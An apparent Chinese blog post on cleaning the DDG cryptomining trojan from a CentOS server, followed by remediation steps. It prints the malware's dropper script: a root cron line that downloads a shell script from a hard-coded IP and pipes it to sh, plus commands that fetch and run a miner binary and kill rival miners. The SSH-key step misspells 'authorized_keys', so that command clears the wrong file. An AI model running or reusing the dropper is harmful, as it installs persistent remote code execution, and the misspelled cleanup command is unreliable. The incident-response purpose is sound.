---
layout: post
title: Linux 清理挖矿木马DDG
categories: [cate1, cate2]
description: some word here
keywords: keyword1, keyword2
---

> DDG挖矿病毒是一款在Linux系统下运行的恶意挖矿病毒，该病毒从去年一直活跃在现在，已经挖取了价值一千多万人民币的虚拟币货币，此病毒样本在一年左右的时间，已开发出了多个变种样本，此次发现的为DDG.3012/DDG3013挖矿版本。

# 环境说明

- 系统： Centos 7.2 x86_64
- DDG脚本：curl -fsSL http://13.113.240.221:8000/i.sh

# 一、DDG 木马脚本内容

```bash
# crontab(root)
$ crontab -l
*/15 * * * * curl -fsSL http://13.113.240.221:8000/i.sh | sh

$ curl -fsSL http://13.113.240.221:8000/i.sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "" > /var/spool/cron/root
echo "*/15 * * * * curl -fsSL http://13.113.240.221:8000/i.sh | sh" >> /var/spool/cron/root


mkdir -p /var/spool/cron/crontabs
echo "" > /var/spool/cron/crontabs/root
echo "*/15 * * * * curl -fsSL http://13.113.240.221:8000/i.sh | sh" >> /var/spool/cron/crontabs/root


ps auxf | grep -v grep | grep /tmp/ddgs.3014 || rm -rf /tmp/ddgs.3014
if [ ! -f "/tmp/ddgs.3014" ]; then

    curl -fsSL http://13.113.240.221:8000/static/3014/ddgs.$(uname -m) -o /tmp/ddgs.3014
fi
chmod +x /tmp/ddgs.3014 && /tmp/ddgs.3014

ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill
#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
```

# 二、 清除方案

## 1. 清理不明主机名ssh免登陆密钥

```bash
[root@VM_152_184_centos /]# > /root/.ssh/autherized_keys

#使用chattr锁定密钥文件,防止被恶意写入
[root@VM_152_184_centos /]# chattr +i  /root/.ssh/authorized_keys
```

## 2. Linux用root强制踢掉已登录不明用户

```bash
# 首先使用w命令查看所有在线用户：
[root@VM_152_184_centos /]# w
 20:50:14 up 9 days,  5:58,  3 users,  load average: 0.21, 0.05, 0.02
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    101.45.224.253   20:48    0.00s  0.00s  0.00s w
root     pts/1    101.45.224.253   20:49   17.00s  0.00s  0.00s -bash
hmj      pts/2    101.45.224.253   20:50    2.00s  0.00s  0.00s -bash

# 执行命令：pkill -kill -t TTY值  例：踢掉已登录用户hmj
[root@VM_152_184_centos /]# pkill -kill -t pts/2

# 再用w命令查看是否已经强制踢掉：
[root@VM_152_184_centos /]# w
 20:55:10 up 9 days,  6:03,  2 users,  load average: 0.03, 0.03, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    101.45.224.253   20:48    0.00s  0.00s  0.00s w
root     pts/1    101.45.224.253   20:49    5:13   0.00s  0.00s -bash
```

## 3. 查找相应的挖矿程序

然后删除相应的恶意程序，在临时目录下

/tmp/qW3xT.2、/tmp/ddgs.3013、/tmp/ddgs.3012、/tmp/wnTKYg、/tmp/2t3ik等文件

## 4.结束掉挖矿和DDG母体相关进程

```bash
[root@VM_152_184_centos /]# ps -ef | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg|qW3xT' | awk '{print $2}' | xargs kill -9
```

## 5.清除到定时任务，相应的定时任务文件

```bash
/var/spool/cron/root
/var/spool/cron/crontabs/root
```

> 参考链接：<https://www.freebuf.com/articles/system/180385.html>